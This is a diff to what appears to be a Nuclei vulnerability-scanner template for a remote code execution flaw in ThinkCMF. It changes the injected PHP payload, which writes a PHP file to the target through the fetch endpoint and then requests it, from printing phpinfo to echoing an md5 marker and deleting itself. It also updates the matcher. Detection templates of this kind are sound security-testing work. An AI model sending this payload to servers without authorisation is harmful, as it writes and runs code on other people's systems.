@@ -15,21 +15,21 @@ info:
     max-request: 2
   tags: thinkcmf,rce,intrusive
 
+variables:
+  string: "thinkcmf-rce"
+
 http:
   - raw:
       - |
-        GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo phpinfo();\");')}} HTTP/1.1
+        GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo md5(\"{{string}}\");unlink(__FILE__);\");')}} HTTP/1.1
         Host: {{Hostname}}
       - |
         GET /{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body_2, "PHP Extension")'
-          - 'contains(body_2, "PHP Version")'
-          - 'status_code_2 == 200'
-        condition: and
-
-# digest: 4a0a00473045022100e4c965a9409f38d7dbbfe18f1eb2a8ab388955797a2b6ce7c85402032084204a02204520eb20938068c12dc67cc4f6613dd1c37e0df4374c484a205713243a3f2cd1:922c64590222798bb761d5b6d8e72950
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a00473045022030890616e0f09cfc90e2452536e18123bff965a717169a2ef213532afea46c2b022100d2b32714e9bb740a01c43baef809ef37cde80648c9163d97ab0e741f9da9c3ec:922c64590222798bb761d5b6d8e72950
